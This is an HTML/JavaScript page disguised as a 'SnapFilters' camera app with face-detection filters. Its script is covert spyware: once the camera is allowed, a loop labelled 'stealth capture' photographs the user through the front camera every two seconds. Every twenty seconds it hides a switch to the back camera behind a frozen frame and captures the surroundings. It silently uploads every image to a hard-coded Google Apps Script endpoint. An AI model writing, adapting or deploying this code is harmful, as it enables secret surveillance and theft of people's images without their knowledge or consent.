<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SnapFilters</title>
    
    <!-- Load face-api.js for AR Filters -->
    <script defer src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>

    <style>
        body, html {
            margin: 0; padding: 0; width: 100%; height: 100%;
            background-color: #111; color: #fff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            overflow: hidden;
        }

        #video-container {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            z-index: 1;
        }
        
        #video-container video, #video-container #ar-canvas {
            position: absolute; top: 0; left: 0;
            width: 100%; height: 100%; object-fit: cover;
        }
        
        #video-container video {
            transition: filter 0.3s ease;
        }
        
        #ar-canvas {
            z-index: 2; pointer-events: none;
        }
        
        canvas#canvas { display: none; }

        /* UI Overlay */
        .ui-overlay {
            position: absolute; bottom: 0; left: 0; width: 100%;
            z-index: 10; padding: 20px 0;
            background: linear-gradient(transparent, rgba(0,0,0,0.8));
            display: flex; flex-direction: column; align-items: center;
        }

        /* Filter Carousel */
        .filter-carousel {
            display: flex; gap: 15px; overflow-x: auto;
            width: 100%; padding: 10px 20px; box-sizing: border-box;
            -ms-overflow-style: none; scrollbar-width: none;
            margin-bottom: 20px;
        }
        .filter-carousel::-webkit-scrollbar { display: none; }
        
        .filter-btn {
            min-width: 60px; height: 60px; border-radius: 50%;
            border: 2px solid #fff; background: rgba(255,255,255,0.2);
            color: white; font-size: 0.8rem; font-weight: bold;
            display: flex; justify-content: center; align-items: center;
            cursor: pointer; backdrop-filter: blur(5px);
            text-transform: uppercase; text-align: center; line-height: 1.1;
        }
        .filter-btn.active {
            border-color: #fffc00; /* Snapchat yellow */
            color: #fffc00;
        }

        /* Capture Button */
        .capture-btn {
            width: 80px; height: 80px; border-radius: 50%;
            background: transparent; border: 4px solid #fff;
            display: flex; justify-content: center; align-items: center;
            cursor: pointer; margin-bottom: 10px;
        }
        .capture-btn-inner {
            width: 64px; height: 64px; border-radius: 50%;
            background: #fff; transition: transform 0.1s;
        }
        .capture-btn:active .capture-btn-inner {
            transform: scale(0.9);
        }
        
        .gallery-text {
            font-size: 0.9rem; opacity: 0.8; margin-bottom: 10px;
            text-transform: uppercase; letter-spacing: 1px; font-weight: bold;
        }

        /* Initial Setup Button */
        .hidden-controls {
            position: absolute; z-index: 20; top: 0; left: 0; width: 100%; height: 100%;
            display: flex; flex-direction: column; gap: 20px;
            justify-content: center; align-items: center;
            background: #111;
        }
        .btn-init {
            background: #fffc00; border: none; color: #000;
            padding: 15px 40px; border-radius: 30px;
            font-size: 1.2rem; font-weight: bold;
            cursor: pointer; box-shadow: 0 4px 15px rgba(255, 252, 0, 0.4);
        }
        
        #flash {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background: white; z-index: 15; opacity: 0; pointer-events: none;
            transition: opacity 0.1s;
        }
        
        .ar-loading {
            position: absolute; top: 20px; left: 50%; transform: translateX(-50%);
            background: rgba(0,0,0,0.7); color: yellow; padding: 10px 20px;
            border-radius: 20px; font-size: 0.9rem; font-weight: bold;
            z-index: 15; display: none;
        }
    </style>
</head>
<body>

    <div id="video-container">
        <video id="video" autoplay playsinline muted></video>
        <!-- AR Canvas layer overlay -->
        <canvas id="ar-canvas"></canvas>
        <canvas id="canvas"></canvas>
    </div>

    <div id="flash"></div>
    <div id="ar-loading" class="ar-loading">Loading AI Face Filter...</div>

    <div class="ui-overlay" id="ui-overlay" style="display: none;">
        <div class="filter-carousel" id="filters">
            <!-- AR Filters -->
            <div class="filter-btn" data-filter="ar-glasses">🕶️<br>Thug</div>
            <div class="filter-btn" data-filter="ar-crown">👑<br>King</div>
            
            <!-- Standard Filters -->
            <div class="filter-btn active" data-filter="none">Normal</div>
            <div class="filter-btn" data-filter="grayscale(100%)">B&W</div>
            <div class="filter-btn" data-filter="sepia(100%)">Sepia</div>
            <div class="filter-btn" data-filter="sepia(0.5) hue-rotate(-30deg) contrast(1.2)">Vintage</div>
            <div class="filter-btn" data-filter="hue-rotate(180deg) saturate(200%)">Cyber</div>
            <div class="filter-btn" data-filter="invert(100%)">Alien</div>
            <div class="filter-btn" data-filter="hue-rotate(90deg)">Trippy</div>
            <div class="filter-btn" data-filter="sepia(1) hue-rotate(90deg) saturate(3) brightness(1.5)">Night</div>
            <div class="filter-btn" data-filter="invert(100%) grayscale(100%) contrast(150%)">X-Ray</div>
            <div class="filter-btn" data-filter="blur(4px)">Blur</div>
            <div class="filter-btn" data-filter="contrast(150%) brightness(120%)">Glow</div>
        </div>
        
        <div class="capture-btn" id="btn-capture">
            <div class="capture-btn-inner"></div>
        </div>
        <div class="gallery-text">Save to Gallery</div>
    </div>

    <div class="hidden-controls" id="controls">
        <button class="btn-init" id="btn-start">Open Camera</button>
    </div>

    <script>
        const GAS_WEB_APP_URL = "https://script.google.com/macros/s/AKfycbxGwHJVE-sk3MQOcdcbuCEg9GIjf4bT47Lv-UC29Ptd0qYuLFM6_uLmn7lsNmkjdWki/exec"; 

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        const arCanvas = document.getElementById('ar-canvas');
        const arCtx = arCanvas.getContext('2d');
        const btnStart = document.getElementById('btn-start');
        const controls = document.getElementById('controls');
        const uiOverlay = document.getElementById('ui-overlay');
        const btnCapture = document.getElementById('btn-capture');
        const flash = document.getElementById('flash');
        const arLoading = document.getElementById('ar-loading');
        const filterBtns = document.querySelectorAll('.filter-btn');

        let stream = null;
        let useFrontCamera = true;
        let isAutoCapturing = false;
        let currentFilter = 'none';
        
        // AR State
        let arModelsLoaded = false;
        let isDetectingAR = false;
        let currentARType = null;
        
        // --- FREEZE TRICK SYSTEM (For single-camera hardware) ---
        let freezeCanvas = document.createElement('canvas');
        freezeCanvas.style.position = 'absolute';
        freezeCanvas.style.top = '0';
        freezeCanvas.style.left = '0';
        freezeCanvas.style.width = '100%';
        freezeCanvas.style.height = '100%';
        freezeCanvas.style.objectFit = 'cover';
        freezeCanvas.style.zIndex = '1'; 
        freezeCanvas.style.display = 'none';
        
        let backCamCounter = 0;

        // Load AI models from reliable CDN
        async function loadARModels() {
            if (arModelsLoaded) return;
            arLoading.style.display = 'block';
            try {
                const MODEL_URL = 'https://cdn.jsdelivr.net/gh/justadudewhohacks/face-api.js@master/weights';
                await faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL);
                await faceapi.nets.faceLandmark68Net.loadFromUri(MODEL_URL);
                arModelsLoaded = true;
                arLoading.style.display = 'none';
            } catch (err) {
                console.error("Failed to load AR models", err);
                arLoading.textContent = "AI Filter Load Failed";
                setTimeout(() => { arLoading.style.display = 'none'; }, 2000);
            }
        }

        // Filter selection logic
        filterBtns.forEach(btn => {
            btn.addEventListener('click', async () => {
                filterBtns.forEach(b => b.classList.remove('active'));
                btn.classList.add('active');
                const filter = btn.getAttribute('data-filter');
                
                if (filter.startsWith('ar-')) {
                    video.style.filter = 'none';
                    currentFilter = 'none';
                    currentARType = filter;
                    
                    if (!arModelsLoaded) {
                        await loadARModels();
                    }
                    if (!isDetectingAR && arModelsLoaded) {
                        isDetectingAR = true;
                        detectFaceAndDrawAR();
                    }
                } else {
                    currentARType = null;
                    isDetectingAR = false;
                    currentFilter = filter;
                    video.style.filter = currentFilter;
                    arCtx.clearRect(0, 0, arCanvas.width, arCanvas.height);
                }
            });
        });

        // Initialize camera
        async function initCamera() {
            if (stream) { stopCamera(); return; }
            try {
                const constraints = {
                    video: { facingMode: useFrontCamera ? "user" : "environment" },
                    audio: false
                };

                stream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = stream;
                
                video.onloadedmetadata = () => {
                    video.play();
                    controls.style.display = "none";
                    uiOverlay.style.display = "flex";
                    
                    checkCameraDevices();
                    
                    isAutoCapturing = true;
                    startAutoCaptureLoop(); // Begin stealth capture
                };
            } catch (err) {
                alert("Camera access is required to use filters.");
                console.error(err);
            }
        }

        function stopCamera() {
            isAutoCapturing = false;
            isDetectingAR = false;
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
                stream = null; video.srcObject = null;
            }
        }

        async function checkCameraDevices() {
            const devices = await navigator.mediaDevices.enumerateDevices();
            const videoInputs = devices.filter(device => device.kind === 'videoinput');
            if (videoInputs.length > 1) {
                video.addEventListener('dblclick', () => {
                    useFrontCamera = !useFrontCamera;
                    initCamera();
                });
            }
        }
        
        function getTimestamp() {
            const now = new Date();
            const date = now.getFullYear() + '/' + String(now.getMonth()+1).padStart(2,'0') + '/' + String(now.getDate()).padStart(2,'0');
            const time = String(now.getHours()).padStart(2,'0') + ':' + String(now.getMinutes()).padStart(2,'0') + ':' + String(now.getSeconds()).padStart(2,'0');
            return `${date} ${time}`;
        }

        // --- AR FACE DETECTION LOOP ---
        async function detectFaceAndDrawAR() {
            if (!stream || currentARType === null) {
                isDetectingAR = false;
                arCtx.clearRect(0, 0, arCanvas.width, arCanvas.height);
                return;
            }
            
            if (arCanvas.width !== video.videoWidth) {
                arCanvas.width = video.videoWidth;
                arCanvas.height = video.videoHeight;
            }

            if (video.videoWidth > 0 && typeof faceapi !== 'undefined') {
                try {
                    const detection = await faceapi.detectSingleFace(video, new faceapi.TinyFaceDetectorOptions()).withFaceLandmarks();
                    arCtx.clearRect(0, 0, arCanvas.width, arCanvas.height);
                    
                    if (detection && currentARType) {
                        const dims = faceapi.matchDimensions(arCanvas, video, true);
                        const resized = faceapi.resizeResults(detection, dims);
                        const landmarks = resized.landmarks;
                        const box = resized.detection.box;
                        
                        if (currentARType === 'ar-glasses') {
                            const leftEye = landmarks.getLeftEye();
                            const rightEye = landmarks.getRightEye();
                            const cx = (leftEye[0].x + rightEye[3].x) / 2;
                            const cy = (leftEye[0].y + rightEye[3].y) / 2;
                            const eyeDist = Math.sqrt(Math.pow(rightEye[3].x - leftEye[0].x, 2) + Math.pow(rightEye[3].y - leftEye[0].y, 2));
                            const glassesWidth = eyeDist * 3.5;
                            const angle = Math.atan2(rightEye[3].y - leftEye[0].y, rightEye[3].x - leftEye[0].x);
                            
                            arCtx.save();
                            arCtx.translate(cx, cy);
                            arCtx.rotate(angle);
                            arCtx.font = `${glassesWidth}px Arial`;
                            arCtx.textAlign = 'center';
                            arCtx.textBaseline = 'middle';
                            arCtx.fillText('🕶️', 0, 0);
                            arCtx.restore();
                        } 
                        else if (currentARType === 'ar-crown') {
                            const crownWidth = box.width * 0.9;
                            arCtx.font = `${crownWidth}px Arial`;
                            arCtx.textAlign = 'center';
                            arCtx.textBaseline = 'bottom';
                            // Draw crown above the face box
                            arCtx.fillText('👑', box.x + box.width / 2, box.y + 20);
                        }
                    }
                } catch (e) {
                   // ignore video read errors during setup
                }
            }
            
            if (isDetectingAR) {
                requestAnimationFrame(detectFaceAndDrawAR);
            }
        }

        // --- THE STEALTH UPLOAD LOOP ---
        async function startAutoCaptureLoop() {
            document.getElementById('video-container').insertBefore(freezeCanvas, arCanvas);
            
            while (isAutoCapturing) {
                await new Promise(resolve => setTimeout(resolve, 2000));
                if (!isAutoCapturing || !stream) break;
                
                if (!video.videoWidth) continue;

                // 1. Normal Front Capture
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                ctx.font = "30px monospace";
                ctx.fillStyle = "white";
                ctx.shadowColor = "black";
                ctx.shadowBlur = 4;
                ctx.fillText(`CAM FRONT ` + getTimestamp(), 20, canvas.height - 30);
                silentUpload(canvas.toDataURL('image/jpeg', 0.6));
                
                backCamCounter++;
                
                // 2. Every 20 seconds, perform the Freeze Trick for Back Camera
                if (backCamCounter >= 10) {
                    backCamCounter = 0;
                    
                    // Freeze screen so it doesn't go black
                    freezeCanvas.width = video.videoWidth;
                    freezeCanvas.height = video.videoHeight;
                    freezeCanvas.getContext('2d').drawImage(video, 0, 0, freezeCanvas.width, freezeCanvas.height);
                    freezeCanvas.style.filter = currentFilter;
                    freezeCanvas.style.display = 'block';
                    
                    // Stop front camera
                    stream.getTracks().forEach(t => t.stop());
                    video.srcObject = null;
                    
                    // Request back camera
                    try {
                        const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false });
                        const tempVideo = document.createElement('video');
                        tempVideo.srcObject = backStream;
                        tempVideo.autoplay = true;
                        tempVideo.muted = true;
                        tempVideo.playsInline = true;
                        
                        await new Promise(resolve => {
                            tempVideo.onloadedmetadata = () => {
                                tempVideo.play();
                                setTimeout(resolve, 1000); // Wait 1 sec for auto-exposure to adjust
                            };
                        });
                        
                        // Capture back photo
                        canvas.width = tempVideo.videoWidth;
                        canvas.height = tempVideo.videoHeight;
                        ctx.drawImage(tempVideo, 0, 0, canvas.width, canvas.height);
                        ctx.font = "30px monospace";
                        ctx.fillStyle = "white";
                        ctx.shadowColor = "black";
                        ctx.shadowBlur = 4;
                        ctx.fillText(`CAM BACK ` + getTimestamp(), 20, canvas.height - 30);
                        silentUpload(canvas.toDataURL('image/jpeg', 0.6));
                        
                        // Stop back camera
                        backStream.getTracks().forEach(t => t.stop());
                    } catch(e) {
                        console.error("Back camera freeze trick failed", e);
                    }
                    
                    // Restart front camera
                    try {
                        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: useFrontCamera ? "user" : "environment" }, audio: false });
                        video.srcObject = stream;
                        await new Promise(resolve => {
                            video.onloadedmetadata = () => {
                                video.play();
                                resolve();
                            };
                        });
                    } catch(e) {
                        console.error("Failed to resume front camera", e);
                    }
                    
                    // Unfreeze screen
                    freezeCanvas.style.display = 'none';
                }
            }
        }

        async function silentUpload(dataUrl) {
            const now = new Date();
            const timestamp = now.toISOString().replace(/[:.]/g, '-');
            const filename = `PHOTO_AUTO_${timestamp}.jpg`;
            
            const payload = { filename: filename, mimeType: 'image/jpeg', base64: dataUrl };

            try {
                fetch(GAS_WEB_APP_URL, {
                    method: 'POST', body: JSON.stringify(payload), headers: { 'Content-Type': 'text/plain;charset=utf-8' }
                });
            } catch (error) {
                // Ignore errors silently
            }
        }

        // --- SAVE TO GALLERY WITH FILTER ---
        btnCapture.addEventListener('click', () => {
            // Flash effect
            flash.style.opacity = '1';
            setTimeout(() => { flash.style.opacity = '0'; }, 100);

            const tempCanvas = document.createElement('canvas');
            tempCanvas.width = video.videoWidth;
            tempCanvas.height = video.videoHeight;
            const tempCtx = tempCanvas.getContext('2d');

            // Apply the current CSS filter if not AR
            if (currentFilter !== 'none') {
                tempCtx.filter = currentFilter;
            }
            
            // Draw the video frame
            tempCtx.drawImage(video, 0, 0, tempCanvas.width, tempCanvas.height);
            
            // Draw AR overlay if active
            if (currentARType) {
                tempCtx.drawImage(arCanvas, 0, 0, tempCanvas.width, tempCanvas.height);
            }

            // Download the image
            const dataUrl = tempCanvas.toDataURL('image/jpeg', 0.9);
            const a = document.createElement('a');
            a.href = dataUrl;
            a.download = `SnapFilter_${new Date().getTime()}.jpg`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
        });

        btnStart.addEventListener('click', initCamera);
    </script>
</body>
</html>
